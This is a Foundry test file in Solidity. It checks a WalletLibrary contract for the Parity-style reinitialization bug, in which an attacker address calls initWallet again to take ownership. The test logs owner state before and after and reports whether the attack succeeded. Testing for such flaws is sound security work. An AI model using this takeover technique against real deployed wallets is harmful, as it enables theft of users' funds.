// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/parity_wallet_bug_2.sol";

contract WalletLibraryTest is Test {
    WalletLibrary wallet;
    address owner1 = address(0x1);
    address owner2 = address(0x2);
    address attacker = address(0x999);

    function setUp() public {
        wallet = new WalletLibrary();
    }

    function testInitializationVulnerability() public {
        // Initial legitimate initialization by owner1
        address[] memory initialOwners = new address[](1);
        initialOwners[0] = owner2;
        vm.prank(owner1);
        wallet.initWallet(initialOwners, 1, 1 ether);

        // Verify initial owners are set correctly
        assertTrue(wallet.isOwner(owner1));
        assertTrue(wallet.isOwner(owner2));

        // --- BEFORE-Trigger state snapshot ---
        console.log("--- BEFORE-Trigger state ---");
        uint256 beforeNumOwners = wallet.m_numOwners();
        bool beforeOwner1 = wallet.isOwner(owner1);
        bool beforeOwner2 = wallet.isOwner(owner2);
        bool beforeAttacker = wallet.isOwner(attacker);
        console.log("Owner count:", beforeNumOwners);
        console.log("owner1 status:", beforeOwner1);
        console.log("owner2 status:", beforeOwner2);
        console.log("attacker status:", beforeAttacker);

        // --- Trigger attacker action ---
        console.log("--- Trigger: Attacker attempts reinitialization ---");
        address[] memory maliciousOwners = new address[](1);
        maliciousOwners[0] = attacker;
        bool attackSucceeded;
        
        // Attempt reinitialization
        vm.prank(attacker);
        try wallet.initWallet(maliciousOwners, 1, 1 ether) {
            attackSucceeded = true;
            console.log("Reinitialization completed without revert");
        } catch {
            attackSucceeded = false;
            console.log("Reinitialization reverted");
        }

        // --- AFTER-Trigger state snapshot ---
        console.log("--- AFTER-Trigger state ---");
        uint256 afterNumOwners = wallet.m_numOwners();
        bool afterOwner1 = wallet.isOwner(owner1);
        bool afterOwner2 = wallet.isOwner(owner2);
        bool afterAttacker = wallet.isOwner(attacker);
        console.log("Owner count:", afterNumOwners);
        console.log("owner1 status:", afterOwner1);
        console.log("owner2 status:", afterOwner2);
        console.log("attacker status:", afterAttacker);

        // Vulnerability verdict
        if (attackSucceeded) {
            console.log("Vulnerability Exists: Attacker successfully reinitialized wallet and changed owners");
        } else {
            console.log("Vulnerability not Exist: Attack reverted, owners unchanged");
        }
    }

    // Other tests remain unchanged
    function testCannotInitializeTwiceSameOwner() public {
        // First initialization
        address[] memory owners = new address[](1);
        owners[0] = owner1;
        vm.prank(owner1);
        wallet.initWallet(owners, 1, 1 ether);

        // Second initialization by same address should fail
        vm.prank(owner1);
        vm.expectRevert();
        wallet.initWallet(owners, 1, 1 ether);
    }

    function testCannotInitializeAfterInitialization() public {
        // First initialization by owner1
        address[] memory owners1 = new address[](1);
        owners1[0] = owner1;
        vm.prank(owner1);
        wallet.initWallet(owners1, 1, 1 ether);

        // Second initialization by different address should fail
        address[] memory owners2 = new address[](1);
        owners2[0] = owner2;
        vm.prank(owner2);
        vm.expectRevert();
        wallet.initWallet(owners2, 1, 1 ether);
    }
}